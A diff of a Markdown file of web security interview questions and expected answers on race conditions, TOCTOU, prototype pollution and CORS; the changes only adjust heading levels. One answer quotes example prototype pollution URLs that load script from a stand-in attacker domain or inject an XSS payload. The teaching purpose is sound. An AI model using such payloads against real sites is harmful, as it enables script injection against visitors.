@@ -64,7 +64,7 @@
 
 Content will be separated by attack types.
 
-##### Race conditions
+#### Race conditions
 
 1. What is a race condition attack?  
 **Expected Answer**: A race condition attack uses carefully timed requests to cause intentional collisions and exploit this unintended behavior.
@@ -107,7 +107,7 @@ Content will be separated by attack types.
 **Expected Answer**: A Time-of-Check to Time-of-Use (TOCTOU) race condition occurs when a program checks the state of a resource, like a file or a database entry, and then uses that resource based on the check's results at a later time. If the resource's state changes between the check and the use, it can lead to inconsistencies or security vulnerabilities. For example, a program might check if a file exists and has the right permissions, but by the time it actually reads the file, the file might have been changed or replaced.
 To mitigate TOCTOU vulnerabilities, one effective strategy is to perform the check and the use of the resource as a single atomic operation, ensuring that the state does not change between the check and the use. Another approach is to use file locks or transactional mechanisms where the resource is locked during the check and remains locked until the use is completed.
 
-##### Prototype Pollution
+#### Prototype Pollution
 
 1. What is prototype pollution?  
 **Expected Answer**: Prototype pollution is a JavaScript vulnerability that enables an attacker to add arbitrary properties to global object prototypes, which may then be inherited by user-defined objects. Although prototype pollution is often unexploitable as a standalone vulnerability, it lets an attacker control properties of objects that would otherwise be inaccessible. If the application subsequently handles an attacker-controlled property in an unsafe way, this can potentially be chained with other vulnerabilities. In client-side JavaScript, this commonly leads to DOM XSS, while server-side prototype pollution can even result in remote code execution.
@@ -164,7 +164,7 @@ In this case, objectFromJson will have a property \_\_proto\_\_ with the value `
 However, this approach can be exploited if an attacker is able to pollute the global Object.prototype with their own transport_url property. This polluted property would then be inherited by the config object, causing the library to load a script from an attacker-controlled domain.
 Manipulating the transport_url via a query parameter in the website URL. For example, by directing a victim to https://vulnerable-website.com/?__proto__[transport_url]=//evil-user.net, the attacker can make the victim's browser load a malicious script. Alternatively, an XSS payload can be embedded directly using a data: URL, like https://vulnerable-website.com/?__proto__[transport_url]=data:,alert(1);//, with the trailing // serving to comment out any suffixes added by the library.
 
-##### Cross-Origin Resource Sharing (CORS)
+#### Cross-Origin Resource Sharing (CORS)
 
 1. What is CORS (cross-origin resource sharing)?  
 **Expected Answer**: Cross-origin resource sharing (CORS) is a browser mechanism which enables controlled access to resources located outside of a given domain. It extends and adds flexibility to the same-origin policy (SOP). However, it also provides potential for cross-domain attacks, if a website's CORS policy is poorly configured and implemented. CORS is not a protection against cross-origin attacks such as cross-site request forgery (CSRF). CORS is about controlling access to resources from different domains, focusing on a "read" access model.
